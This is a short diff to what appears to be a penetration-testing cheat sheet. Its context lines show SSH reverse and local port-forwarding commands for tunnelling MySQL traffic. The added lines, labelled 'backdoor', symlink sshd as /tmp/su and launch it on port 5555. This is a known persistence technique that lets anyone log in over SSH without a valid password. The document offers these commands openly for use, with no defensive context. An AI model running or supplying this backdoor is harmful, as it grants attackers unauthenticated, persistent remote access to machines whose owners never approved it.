@@ -38,3 +38,9 @@ ssh -C -f -N -g -R 3306::3306 root@8.8.8.8 -p 22
 
 #Local Forward
 ssh -g -L  3306:8.8.8.8:3306  master@8.8.8.8
+
+
+backdoor
+ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;
+
+
